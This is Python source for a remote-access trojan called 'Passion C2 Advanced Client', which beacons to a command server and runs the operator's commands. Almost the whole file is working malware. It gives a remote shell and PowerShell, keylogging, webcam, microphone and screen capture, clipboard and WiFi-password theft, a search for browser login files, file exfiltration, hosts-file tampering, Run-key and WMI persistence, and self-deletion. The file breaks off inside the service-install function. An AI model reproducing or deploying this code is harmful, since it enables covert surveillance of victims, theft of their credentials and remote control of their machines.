#!/usr/bin/env python3
"""
Passion C2 Advanced Client
Remote Administration Tool - Professional Grade
"""

import os
import sys
import json
import time
import uuid
import socket
import base64
import platform
import threading
import subprocess
import argparse
import logging
import signal
import hashlib
import requests
import psutil
import winreg
import ctypes
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple, Callable
from dataclasses import dataclass, asdict
from queue import Queue, Empty
from concurrent.futures import ThreadPoolExecutor

# Windows-specific imports (optional)
try:
    import mss
    import pyaudio
    import cv2
    import numpy as np
    from PIL import ImageGrab
    WINDOWS_VISION = True
except ImportError:
    WINDOWS_VISION = False
    print("[!] Some features require: pip install mss opencv-python pillow pyaudio")

# =============================================================================
# Configuration
# =============================================================================

@dataclass
class Config:
    """Client configuration"""
    server_url: str = "https://www.getpassion.xyz"
    agent_id: str = ""
    heartbeat_interval: int = 5
    reconnect_delay: int = 3
    max_retries: int = 5
    screenshot_quality: int = 70
    stream_fps: int = 5
    stream_quality: int = 40
    buffer_size: int = 8192
    debug: bool = False
    
    @classmethod
    def load(cls, path: Optional[str] = None):
        """Load configuration from file or environment"""
        config = cls()
        
        # Try to load from file
        if path and os.path.exists(path):
            with open(path, 'r') as f:
                data = json.load(f)
                for key, value in data.items():
                    if hasattr(config, key):
                        setattr(config, key, value)
        
        # Override with environment variables
        config.server_url = os.getenv('C2_SERVER_URL', config.server_url)
        config.agent_id = os.getenv('C2_AGENT_ID', config.agent_id)
        
        # Generate agent ID if not set
        if not config.agent_id:
            hostname = socket.gethostname()
            username = os.getenv('USERNAME') or os.getenv('USER') or 'unknown'
            config.agent_id = f"{hostname}__{username}"
        
        return config

# =============================================================================
# System Information Collection
# =============================================================================

class SystemInfo:
    """Collect detailed system information"""
    
    @staticmethod
    def get_hostname() -> str:
        return socket.gethostname()
    
    @staticmethod
    def get_username() -> str:
        return os.getenv('USERNAME') or os.getenv('USER') or 'unknown'
    
    @staticmethod
    def get_platform() -> str:
        return f"{platform.system()} {platform.release()} ({platform.machine()})"
    
    @staticmethod
    def get_ip() -> str:
        """Get primary IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "0.0.0.0"
    
    @staticmethod
    def get_mac_addresses() -> List[str]:
        """Get all MAC addresses"""
        macs = []
        for interface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == psutil.AF_LINK:
                    macs.append(addr.address)
        return macs
    
    @staticmethod
    def get_hardware_id() -> str:
        """Generate unique hardware ID"""
        hwid_data = []
        
        # CPU info
        hwid_data.append(str(psutil.cpu_count()))
        try:
            with open('/proc/cpuinfo') as f:
                for line in f:
                    if 'model name' in line:
                        hwid_data.append(line.split(':')[1].strip())
                        break
        except:
            pass
        
        # MAC addresses
        hwid_data.extend(SystemInfo.get_mac_addresses())
        
        # Disk serial
        try:
            for part in psutil.disk_partitions():
                try:
                    usage = psutil.disk_usage(part.mountpoint)
                    hwid_data.append(str(usage.total))
                except:
                    pass
        except:
            pass
        
        # Create hash
        hwid_str = '|'.join(hwid_data)
        return hashlib.sha256(hwid_str.encode()).hexdigest()
    
    @staticmethod
    def get_all() -> Dict[str, Any]:
        """Get all system information"""
        return {
            'hostname': SystemInfo.get_hostname(),
            'username': SystemInfo.get_username(),
            'platform': SystemInfo.get_platform(),
            'ip': SystemInfo.get_ip(),
            'hwid': SystemInfo.get_hardware_id(),
            'cpu_count': psutil.cpu_count(),
            'cpu_percent': psutil.cpu_percent(interval=0.1),
            'memory_total': psutil.virtual_memory().total,
            'memory_available': psutil.virtual_memory().available,
            'disk_usage': {
                part.mountpoint: {
                    'total': psutil.disk_usage(part.mountpoint).total,
                    'used': psutil.disk_usage(part.mountpoint).used,
                    'free': psutil.disk_usage(part.mountpoint).free
                }
                for part in psutil.disk_partitions()
            },
            'boot_time': psutil.boot_time(),
            'processes': len(psutil.pids())
        }

# =============================================================================
# Command Handlers
# =============================================================================

class CommandHandler:
    """Handle all command types"""
    
    def __init__(self, client: 'C2Client'):
        self.client = client
        self.handlers = {
            'ping': self.cmd_ping,
            'screenshot': self.cmd_screenshot,
            'stream_start': self.cmd_stream_start,
            'stream_stop': self.cmd_stream_stop,
            'file_list': self.cmd_file_list,
            'file_download': self.cmd_file_download,
            'file_upload': self.cmd_file_upload,
            'file_delete': self.cmd_file_delete,
            'process_list': self.cmd_process_list,
            'process_kill': self.cmd_process_kill,
            'block_sites': self.cmd_block_sites,
            'unblock_sites': self.cmd_unblock_sites,
            'message': self.cmd_message,
            'startup_enable': self.cmd_startup_enable,
            'startup_disable': self.cmd_startup_disable,
            'shell': self.cmd_shell,
            'powershell': self.cmd_powershell,
            'keylogger_start': self.cmd_keylogger_start,
            'keylogger_stop': self.cmd_keylogger_stop,
            'webcam_capture': self.cmd_webcam_capture,
            'audio_record': self.cmd_audio_record,
            'clipboard_get': self.cmd_clipboard_get,
            'browser_steal': self.cmd_browser_steal,
            'wifi_passwords': self.cmd_wifi_passwords,
            'persistence': self.cmd_persistence,
            'self_destruct': self.cmd_self_destruct,
        }
    
    def handle(self, command: Dict[str, Any]) -> None:
        """Execute a command"""
        cmd_type = command.get('type')
        cmd_id = command.get('id')
        payload = command.get('payload', {})
        
        if cmd_type in self.handlers:
            try:
                self.client.log(f"Executing command: {cmd_type}", 'debug')
                self.handlers[cmd_type](cmd_id, payload)
            except Exception as e:
                self.client.log(f"Command failed {cmd_type}: {str(e)}", 'error')
                self.client.ack_command(cmd_id, success=False, error=str(e))
        else:
            self.client.log(f"Unknown command type: {cmd_type}", 'warning')
    
    def cmd_ping(self, cmd_id: int, payload: Dict) -> None:
        """Simple ping response"""
        self.client.ack_command(cmd_id, result={'pong': True, 'timestamp': time.time()})
    
    def cmd_screenshot(self, cmd_id: int, payload: Dict) -> None:
        """Take screenshot and return as base64"""
        try:
            if platform.system() == 'Windows' and WINDOWS_VISION:
                with mss.mss() as sct:
                    monitor = sct.monitors[1]
                    screenshot = sct.grab(monitor)
                    
                    # Convert to base64
                    img = np.array(screenshot)
                    img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
                    _, buffer = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, self.client.config.screenshot_quality])
                    b64 = base64.b64encode(buffer).decode('utf-8')
                    
                    self.client.ack_command(cmd_id, result={'screenshot_b64': b64})
            else:
                # Cross-platform fallback
                from PIL import ImageGrab
                screenshot = ImageGrab.grab()
                
                # Convert to bytes
                import io
                buffer = io.BytesIO()
                screenshot.save(buffer, format='JPEG', quality=self.client.config.screenshot_quality)
                b64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
                
                self.client.ack_command(cmd_id, result={'screenshot_b64': b64})
        except Exception as e:
            self.client.ack_command(cmd_id, success=False, error=str(e))
    
    def cmd_stream_start(self, cmd_id: int, payload: Dict) -> None:
        """Start live streaming"""
        self.client.streaming = True
        self.client.ack_command(cmd_id, result={'status': 'streaming_started'})
        
        # Start streaming thread
        threading.Thread(target=self._stream_worker, daemon=True).start()
    
    def cmd_stream_stop(self, cmd_id: int, payload: Dict) -> None:
        """Stop live streaming"""
        self.client.streaming = False
        self.client.ack_command(cmd_id, result={'status': 'streaming_stopped'})
    
    def _stream_worker(self) -> None:
        """Background thread for streaming"""
        while self.client.streaming:
            try:
                if platform.system() == 'Windows' and WINDOWS_VISION:
                    with mss.mss() as sct:
                        monitor = sct.monitors[1]
                        screenshot = sct.grab(monitor)
                        
                        # Convert to base64
                        img = np.array(screenshot)
                        img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
                        _, buffer = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, self.client.config.stream_quality])
                        b64 = base64.b64encode(buffer).decode('utf-8')
                        
                        # Send frame via heartbeat
                        self.client.send_stream_frame(b64)
                else:
                    # Cross-platform fallback
                    from PIL import ImageGrab
                    screenshot = ImageGrab.grab()
                    
                    import io
                    buffer = io.BytesIO()
                    screenshot.save(buffer, format='JPEG', quality=self.client.config.stream_quality)
                    b64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
                    
                    self.client.send_stream_frame(b64)
                
                time.sleep(1.0 / self.client.config.stream_fps)
            except Exception as e:
                self.client.log(f"Stream error: {e}", 'error')
                time.sleep(1)
    
    def cmd_file_list(self, cmd_id: int, payload: Dict) -> None:
        """List files in directory"""
        path = payload.get('path', '.')
        
        try:
            files = []
            for item in os.listdir(path):
                full_path = os.path.join(path, item)
                try:
                    stat = os.stat(full_path)
                    files.append({
                        'name': item,
                        'path': full_path,
                        'is_dir': os.path.isdir(full_path),
                        'size': stat.st_size,
                        'modified': datetime.fromtimestamp(stat.st_mtime).isoformat(),
                        'created': datetime.fromtimestamp(stat.st_ctime).isoformat(),
                        'permissions': oct(stat.st_mode)[-3:]
                    })
                except:
                    continue
            
            self.client.ack_command(cmd_id, result={
                'files': files,
                'cwd': os.getcwd(),
                'path': path
            })
        except Exception as e:
            self.client.ack_command(cmd_id, success=False, error=str(e))
    
    def cmd_file_download(self, cmd_id: int, payload: Dict) -> None:
        """Download a file from client"""
        path = payload.get('path')
        
        if not path or not os.path.exists(path):
            self.client.ack_command(cmd_id, success=False, error='File not found')
            return
        
        try:
            with open(path, 'rb') as f:
                file_data = f.read()
            
            b64 = base64.b64encode(file_data).decode('utf-8')
            self.client.ack_command(cmd_id, result={
                'file_upload_b64': b64,
                'file_upload_path': path,
                'file_size': len(file_data)
            })
        except Exception as e:
            self.client.ack_command(cmd_id, success=False, error=str(e))
    
    def cmd_file_upload(self, cmd_id: int, payload: Dict) -> None:
        """Upload file to client"""
        path = payload.get('path')
        name = payload.get('name')
        data_b64 = payload.get('data_b64')
        
        if not path or not name or not data_b64:
            self.client.ack_command(cmd_id, success=False, error='Missing parameters')
            return
        
        try:
            full_path = os.path.join(path, name)
            data = base64.b64decode(data_b64)
            
            with open(full_path, 'wb') as f:
                f.write(data)
            
            self.client.ack_command(cmd_id, result={
                'uploaded': full_path,
                'size': len(data)
            })
        except Exception as e:
            self.client.ack_command(cmd_id, success=False, error=str(e))
    
    def cmd_file_delete(self, cmd_id: int, payload: Dict) -> None:
        """Delete file or directory"""
        path = payload.get('path')
        
        if not path or not os.path.exists(path):
            self.client.ack_command(cmd_id, success=False, error='Path not found')
            return
        
        try:
            if os.path.isdir(path):
                import shutil
                shutil.rmtree(path)
            else:
                os.remove(path)
            
            self.client.ack_command(cmd_id, result={'deleted': path})
        except Exception as e:
            self.client.ack_command(cmd_id, success=False, error=str(e))
    
    def cmd_process_list(self, cmd_id: int, payload: Dict) -> None:
        """List running processes"""
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_info', 'status', 'create_time']):
                try:
                    info = proc.info
                    processes.append({
                        'pid': info['pid'],
                        'name': info['name'],
                        'cpu': info['cpu_percent'] or 0,
                        'mem': info['memory_info'].rss if info['memory_info'] else 0,
                        'status': info['status'],
                        'created': info['create_time']
                    })
                except:
                    continue
            
            self.client.ack_command(cmd_id, result={'processes': processes})
        except Exception as e:
            self.client.ack_command(cmd_id, success=False, error=str(e))
    
    def cmd_process_kill(self, cmd_id: int, payload: Dict) -> None:
        """Kill a process"""
        pid = payload.get('pid')
        
        try:
            proc = psutil.Process(pid)
            proc.terminate()
            self.client.ack_command(cmd_id, result={'killed': pid})
        except Exception as e:
            self.client.ack_command(cmd_id, success=False, error=str(e))
    
    def cmd_block_sites(self, cmd_id: int, payload: Dict) -> None:
        """Block websites via hosts file"""
        domains = payload.get('domains', [])
        
        if not domains:
            self.client.ack_command(cmd_id, success=False, error='No domains provided')
            return
        
        try:
            # Determine hosts file path
            if platform.system() == 'Windows':
                hosts_path = r'C:\Windows\System32\drivers\etc\hosts'
            else:
                hosts_path = '/etc/hosts'
            
            # Read existing hosts
            with open(hosts_path, 'r') as f:
                lines = f.readlines()
            
            # Add blocked entries
            new_lines = []
            for domain in domains:
                entry = f"127.0.0.1 {domain}\n"
                if entry not in lines:
                    new_lines.append(entry)
            
            if new_lines:
                with open(hosts_path, 'a') as f:
                    f.writelines(new_lines)
            
            # Flush DNS
            if platform.system() == 'Windows':
                subprocess.run(['ipconfig', '/flushdns'], capture_output=True)
            else:
                subprocess.run(['systemctl', 'restart', 'nscd'], capture_output=True)
            
            self.client.ack_command(cmd_id, result={
                'blocked': domains,
                'count': len(domains)
            })
        except Exception as e:
            self.client.ack_command(cmd_id, success=False, error=str(e))
    
    def cmd_unblock_sites(self, cmd_id: int, payload: Dict) -> None:
        """Unblock websites"""
        domains = payload.get('domains', [])
        
        try:
            if platform.system() == 'Windows':
                hosts_path = r'C:\Windows\System32\drivers\etc\hosts'
            else:
                hosts_path = '/etc/hosts'
            
            # Read and filter hosts
            with open(hosts_path, 'r') as f:
                lines = f.readlines()
            
            new_lines = []
            for line in lines:
                should_keep = True
                for domain in domains:
                    if f"127.0.0.1 {domain}" in line:
                        should_keep = False
                        break
                if should_keep:
                    new_lines.append(line)
            
            with open(hosts_path, 'w') as f:
                f.writelines(new_lines)
            
            # Flush DNS
            if platform.system() == 'Windows':
                subprocess.run(['ipconfig', '/flushdns'], capture_output=True)
            else:
                subprocess.run(['systemctl', 'restart', 'nscd'], capture_output=True)
            
            self.client.ack_command(cmd_id, result={'unblocked': domains})
        except Exception as e:
            self.client.ack_command(cmd_id, success=False, error=str(e))
    
    def cmd_message(self, cmd_id: int, payload: Dict) -> None:
        """Show message on client"""
        body = payload.get('body', '')
        
        # Display message
        if platform.system() == 'Windows':
            try:
                ctypes.windll.user32.MessageBoxW(0, body, "Message from Admin", 0)
            except:
                print(f"\n[!] ADMIN MESSAGE: {body}\n")
        else:
            print(f"\n[!] ADMIN MESSAGE: {body}\n")
        
        self.client.ack_command(cmd_id, result={'displayed': True})
    
    def cmd_startup_enable(self, cmd_id: int, payload: Dict) -> None:
        """Add to system startup"""
        try:
            if platform.system() == 'Windows':
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0, winreg.KEY_SET_VALUE
                )
                winreg.SetValueEx(key, "PassionC2", 0, winreg.REG_SZ, sys.executable)
                winreg.CloseKey(key)
            else:
                # Linux/Mac
                autostart_dir = os.path.expanduser('~/.config/autostart')
                os.makedirs(autostart_dir, exist_ok=True)
                
                desktop_entry = f"""[Desktop Entry]
Type=Application
Name=PassionC2
Exec={sys.executable} {os.path.abspath(__file__)}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
"""
                with open(os.path.join(autostart_dir, 'passion-c2.desktop'), 'w') as f:
                    f.write(desktop_entry)
            
            self.client.ack_command(cmd_id, result={'startup': 'enabled'})
        except Exception as e:
            self.client.ack_command(cmd_id, success=False, error=str(e))
    
    def cmd_startup_disable(self, cmd_id: int, payload: Dict) -> None:
        """Remove from startup"""
        try:
            if platform.system() == 'Windows':
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0, winreg.KEY_SET_VALUE
                )
                try:
                    winreg.DeleteValue(key, "PassionC2")
                except:
                    pass
                winreg.CloseKey(key)
            else:
                autostart_path = os.path.expanduser('~/.config/autostart/passion-c2.desktop')
                if os.path.exists(autostart_path):
                    os.remove(autostart_path)
            
            self.client.ack_command(cmd_id, result={'startup': 'disabled'})
        except Exception as e:
            self.client.ack_command(cmd_id, success=False, error=str(e))
    
    def cmd_shell(self, cmd_id: int, payload: Dict) -> None:
        """Execute shell command"""
        command = payload.get('command', '')
        
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            self.client.ack_command(cmd_id, result={
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            })
        except subprocess.TimeoutExpired:
            self.client.ack_command(cmd_id, success=False, error='Command timeout (30s)')
        except Exception as e:
            self.client.ack_command(cmd_id, success=False, error=str(e))
    
    def cmd_powershell(self, cmd_id: int, payload: Dict) -> None:
        """Execute PowerShell command"""
        if platform.system() != 'Windows':
            self.client.ack_command(cmd_id, success=False, error='PowerShell only on Windows')
            return
        
        command = payload.get('command', '')
        
        try:
            result = subprocess.run(
                ['powershell', '-Command', command],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            self.client.ack_command(cmd_id, result={
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            })
        except subprocess.TimeoutExpired:
            self.client.ack_command(cmd_id, success=False, error='Command timeout (30s)')
        except Exception as e:
            self.client.ack_command(cmd_id, success=False, error=str(e))
    
    def cmd_keylogger_start(self, cmd_id: int, payload: Dict) -> None:
        """Start keylogging"""
        if platform.system() != 'Windows':
            self.client.ack_command(cmd_id, success=False, error='Keylogger only on Windows')
            return
        
        self.client.keylogging = True
        threading.Thread(target=self._keylogger_worker, daemon=True).start()
        self.client.ack_command(cmd_id, result={'status': 'keylogger_started'})
    
    def cmd_keylogger_stop(self, cmd_id: int, payload: Dict) -> None:
        """Stop keylogging"""
        self.client.keylogging = False
        self.client.ack_command(cmd_id, result={'status': 'keylogger_stopped'})
    
    def _keylogger_worker(self) -> None:
        """Background keylogger thread"""
        try:
            from pynput import keyboard
            
            def on_press(key):
                if not self.client.keylogging:
                    return False
                
                try:
                    self.client.keylog_buffer.append({
                        'key': str(key),
                        'time': time.time()
                    })
                except:
                    pass
            
            with keyboard.Listener(on_press=on_press) as listener:
                listener.join()
        except ImportError:
            self.client.log("Keylogger requires: pip install pynput", 'error')
    
    def cmd_webcam_capture(self, cmd_id: int, payload: Dict) -> None:
        """Capture from webcam"""
        if not WINDOWS_VISION:
            self.client.ack_command(cmd_id, success=False, error='Webcam capture not available')
            return
        
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()
            
            if ret:
                _, buffer = cv2.imencode('.jpg', frame)
                b64 = base64.b64encode(buffer).decode('utf-8')
                self.client.ack_command(cmd_id, result={'webcam_b64': b64})
            else:
                self.client.ack_command(cmd_id, success=False, error='Could not capture from webcam')
        except Exception as e:
            self.client.ack_command(cmd_id, success=False, error=str(e))
    
    def cmd_audio_record(self, cmd_id: int, payload: Dict) -> None:
        """Record audio from microphone"""
        duration = payload.get('duration', 5)
        
        try:
            import wave
            import pyaudio
            
            CHUNK = 1024
            FORMAT = pyaudio.paInt16
            CHANNELS = 1
            RATE = 44100
            
            p = pyaudio.PyAudio()
            stream = p.open(format=FORMAT,
                          channels=CHANNELS,
                          rate=RATE,
                          input=True,
                          frames_per_buffer=CHUNK)
            
            frames = []
            for _ in range(0, int(RATE / CHUNK * duration)):
                data = stream.read(CHUNK)
                frames.append(data)
            
            stream.stop_stream()
            stream.close()
            p.terminate()
            
            # Save to bytes
            import io
            wav_buffer = io.BytesIO()
            wf = wave.open(wav_buffer, 'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()
            
            b64 = base64.b64encode(wav_buffer.getvalue()).decode('utf-8')
            self.client.ack_command(cmd_id, result={'audio_b64': b64, 'duration': duration})
        except Exception as e:
            self.client.ack_command(cmd_id, success=False, error=str(e))
    
    def cmd_clipboard_get(self, cmd_id: int, payload: Dict) -> None:
        """Get clipboard contents"""
        try:
            import pyperclip
            content = pyperclip.paste()
            self.client.ack_command(cmd_id, result={'clipboard': content})
        except ImportError:
            self.client.ack_command(cmd_id, success=False, error='pyperclip not installed')
        except Exception as e:
            self.client.ack_command(cmd_id, success=False, error=str(e))
    
    def cmd_browser_steal(self, cmd_id: int, payload: Dict) -> None:
        """Steal browser data"""
        results = {}
        
        # Browser data paths
        browsers = {
            'chrome': {
                'path': os.path.expanduser('~/.config/google-chrome/Default/Login Data'),
                'win_path': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data')
            },
            'firefox': {
                'path': os.path.expanduser('~/.mozilla/firefox/*.default/logins.json'),
                'win_path': os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles\*.default\logins.json')
            },
            'edge': {
                'win_path': os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data')
            }
        }
        
        for browser, paths in browsers.items():
            try:
                if platform.system() == 'Windows' and 'win_path' in paths:
                    import glob
                    for file in glob.glob(paths['win_path']):
                        if os.path.exists(file):
                            results[browser] = f"Found: {file}"
                elif 'path' in paths and os.path.exists(paths['path']):
                    results[browser] = f"Found: {paths['path']}"
            except:
                pass
        
        self.client.ack_command(cmd_id, result={'browsers': results})
    
    def cmd_wifi_passwords(self, cmd_id: int, payload: Dict) -> None:
        """Get saved WiFi passwords"""
        if platform.system() != 'Windows':
            self.client.ack_command(cmd_id, success=False, error='Only available on Windows')
            return
        
        try:
            result = subprocess.run(
                ['netsh', 'wlan', 'show', 'profiles'],
                capture_output=True,
                text=True
            )
            
            profiles = []
            for line in result.stdout.split('\n'):
                if 'All User Profile' in line:
                    ssid = line.split(':')[1].strip()
                    
                    # Get password
                    pwd_result = subprocess.run(
                        ['netsh', 'wlan', 'show', 'profile', ssid, 'key=clear'],
                        capture_output=True,
                        text=True
                    )
                    
                    password = None
                    for p_line in pwd_result.stdout.split('\n'):
                        if 'Key Content' in p_line:
                            password = p_line.split(':')[1].strip()
                            break
                    
                    profiles.append({
                        'ssid': ssid,
                        'password': password
                    })
            
            self.client.ack_command(cmd_id, result={'wifi_profiles': profiles})
        except Exception as e:
            self.client.ack_command(cmd_id, success=False, error=str(e))
    
    def cmd_persistence(self, cmd_id: int, payload: Dict) -> None:
        """Advanced persistence mechanisms"""
        results = []
        
        # WMI Event Subscription
        try:
            if platform.system() == 'Windows':
                wmi_script = f"""
                $filter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
                $filter.QueryLanguage = "WQL"
                $filter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
                $filter.Name = "PassionPersistence"
                $filter.EventNamespace = 'root\cimv2'
                $result = $filter.Put()
                
                $consumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
                $consumer.Name = 'PassionConsumer'
                $consumer.CommandLineTemplate = "{sys.executable} {os.path.abspath(__file__)}"
                $result = $consumer.Put()
                
                $binding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
                $binding.Filter = $result.Path
                $binding.Consumer = $consumer.Path
                $result = $binding.Put()
                """
                
                with open('persist.ps1', 'w') as f:
                    f.write(wmi_script)
                
                subprocess.run(['powershell', '-ExecutionPolicy', 'Bypass', '-File', 'persist.ps1'],
                             capture_output=True)
                os.remove('persist.ps1')
                results.append('WMI persistence added')
        except:
            pass
        
        self.client.ack_command(cmd_id, result={'persistence': results})
    
    def cmd_self_destruct(self, cmd_id: int, payload: Dict) -> None:
        """Self-destruct the client"""
        self.client.ack_command(cmd_id, result={'self_destruct': True})
        
        # Schedule self-destruct
        def destruct():
            time.sleep(2)
            try:
                # Remove from startup
                if platform.system() == 'Windows':
                    key = winreg.OpenKey(
                        winreg.HKEY_CURRENT_USER,
                        r"Software\Microsoft\Windows\CurrentVersion\Run",
                        0, winreg.KEY_SET_VALUE
                    )
                    try:
                        winreg.DeleteValue(key, "PassionC2")
                    except:
                        pass
                    winreg.CloseKey(key)
                else:
                    autostart = os.path.expanduser('~/.config/autostart/passion-c2.desktop')
                    if os.path.exists(autostart):
                        os.remove(autostart)
                
                # Delete self
                os.remove(sys.executable if getattr(sys, 'frozen', False) else __file__)
            except:
                pass
            finally:
                os._exit(0)
        
        threading.Thread(target=destruct, daemon=True).start()

# =============================================================================
# Main C2 Client
# =============================================================================

class C2Client:
    """Main C2 client class"""
    
    def __init__(self, config: Config):
        self.config = config
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json'
        })
        # Remove X-RAT-Secret header
        # Allow redirects (important for www/non-www handling)
        self.session.max_redirects = 5
        
        self.running = True
        self.streaming = False
        self.keylogging = False
        self.keylog_buffer = []
        
        self.command_handler = CommandHandler(self)
        self.pending_commands = Queue()
        self.blocked_sites = []
        
        # Setup logging
        self.logger = logging.getLogger('C2Client')
        handler = logging.StreamHandler()
        handler.setFormatter(logging.Formatter(
            '%(asctime)s - %(levelname)s - %(message)s'
        ))
        self.logger.addHandler(handler)
        self.logger.setLevel(logging.DEBUG if config.debug else logging.INFO)
        
        # Signal handlers
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
    
    def log(self, msg: str, level: str = 'info') -> None:
        """Log a message"""
        getattr(self.logger, level, self.logger.info)(msg)
    
    def signal_handler(self, signum, frame) -> None:
        """Handle shutdown signals"""
        self.log(f"Received signal {signum}, shutting down...")
        self.running = False
    
    def ack_command(self, cmd_id: int, result: Any = None, success: bool = True, error: str = None) -> None:
        """Acknowledge command completion"""
        try:
            payload = {'id': cmd_id}
            if success:
                payload['result'] = result
            else:
                payload['error'] = error
            
            self.session.post(
                f"{self.config.server_url}/api/rat/commands/{cmd_id}/ack",
                json=payload,
                timeout=10
            )
        except Exception as e:
            self.log(f"Failed to ack command {cmd_id}: {e}", 'error')
    
    def send_stream_frame(self, frame_b64: str) -> None:
        """Send a stream frame via heartbeat"""
        self.stream_frame = frame_b64
        self.stream_frame_time = time.time()
    
    def heartbeat(self) -> Dict[str, Any]:
        """Send heartbeat and get commands"""
        # Collect basic info
        info = SystemInfo.get_all()
        
        # Add optional data
        if hasattr(self, 'screenshot_b64'):
            info['screenshot_b64'] = self.screenshot_b64
            delattr(self, 'screenshot_b64')
        
        if hasattr(self, 'stream_frame') and self.streaming:
            info['stream_frame_b64'] = self.stream_frame
            info['stream_frame_time'] = self.stream_frame_time
            delattr(self, 'stream_frame')
        
        if self.keylog_buffer:
            info['keylog_data'] = self.keylog_buffer.copy()
            self.keylog_buffer.clear()
        
        return info
    
    def process_commands(self, commands: List[Dict]) -> None:
        """Process incoming commands"""
        for cmd in commands:
            self.command_handler.handle(cmd)
    
    def update_blocked_sites(self, sites: List[str]) -> None:
        """Update blocked sites list"""
        self.blocked_sites = sites
    
    def run_once(self) -> bool:
        try:
            # Prepare heartbeat data
            heartbeat_data = self.heartbeat()
            
            # DEBUG: Print what we're sending
            if self.config.debug:
                print("\n" + "="*50)
                print("DEBUG: Sending heartbeat to:", f"{self.config.server_url}/api/rat/heartbeat")
                print("DEBUG: Full payload:", json.dumps(heartbeat_data, indent=2))
                print("="*50 + "\n")
            
            # Send heartbeat with redirect handling
            response = self.session.post(
                f"{self.config.server_url}/api/rat/heartbeat",
                json=heartbeat_data,
                timeout=10,
                allow_redirects=True
            )
            
            # DEBUG: Print response
            if self.config.debug:
                print(f"DEBUG: Response status: {response.status_code}")
                print(f"DEBUG: Response headers: {dict(response.headers)}")
                print(f"DEBUG: Response body: {response.text}")
            
            if response.status_code == 200:
                data = response.json()
                if 'commands' in data:
                    self.process_commands(data['commands'])
                if 'blocked_sites' in data:
                    self.update_blocked_sites(data['blocked_sites'])
                return True
            else:
                self.log(f"Heartbeat failed: {response.status_code}", 'warning')
                return False
                
        except requests.exceptions.RequestException as e:
            self.log(f"Network error: {e}", 'error')
            return False
        except Exception as e:
            self.log(f"Heartbeat error: {e}", 'error')
            return False
    
    def run(self) -> None:
        """Main client loop"""
        self.log(f"Starting C2 client - Agent ID: {self.config.agent_id}")
        self.log(f"Server: {self.config.server_url}")
        
        retry_count = 0
        
        while self.running:
            try:
                if self.run_once():
                    retry_count = 0
                    time.sleep(self.config.heartbeat_interval)
                else:
                    retry_count += 1
                    if retry_count >= self.config.max_retries:
                        self.log("Max retries reached, waiting longer...", 'warning')
                        time.sleep(self.config.reconnect_delay * 2)
                    else:
                        time.sleep(self.config.reconnect_delay)
                        
            except KeyboardInterrupt:
                break
            except Exception as e:
                self.log(f"Unexpected error: {e}", 'error')
                time.sleep(self.config.reconnect_delay)
        
        self.log("Client stopped")

# =============================================================================
# Command-line Interface
# =============================================================================

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(description='Passion C2 Client')
    parser.add_argument('--config', '-c', help='Config file path')
    parser.add_argument('--server', '-s', help='C2 server URL')
    parser.add_argument('--id', help='Agent ID (default: hostname__username)')
    parser.add_argument('--interval', type=int, default=5, help='Heartbeat interval (seconds)')
    parser.add_argument('--debug', action='store_true', help='Enable debug logging')
    parser.add_argument('--install', action='store_true', help='Install as service')
    parser.add_argument('--uninstall', action='store_true', help='Remove service')
    
    args = parser.parse_args()
    
    # Load config
    config = Config.load(args.config)
    
    # Override with command line
    if args.server:
        config.server_url = args.server
    if args.id:
        config.agent_id = args.id
    if args.interval:
        config.heartbeat_interval = args.interval
    if args.debug:
        config.debug = True
    
    # Handle installation
    if args.install:
        install_service(config)
        return
    
    if args.uninstall:
        uninstall_service()
        return
    
    # Run client
    client = C2Client(config)
    try:
        client.run()
    except KeyboardInterrupt:
        print("\n[!] Shutting down...")

def install_service(config: Config) -> None:
    """Install as Windows service"""
    if platform.system() != 'Windows':
        print("[!] Service installation only available on Windows")
        return
    
    try:
        import win32serviceutil
        import win32service
        import win32event
        import servicemanager
        
        class PassionC2Service(win32serviceutil.ServiceFramework):
            _svc_name_ = "PassionC2"
            _svc_display_name_ = "Passion C2 Client"
            _svc_description_ = "Passion Remote Administration Client"
            
            def __init__(self, args):
                win32serviceutil.ServiceFramework.__init__(self, args)
                self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
                self.running = True
            
            def SvcStop(self):
                self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
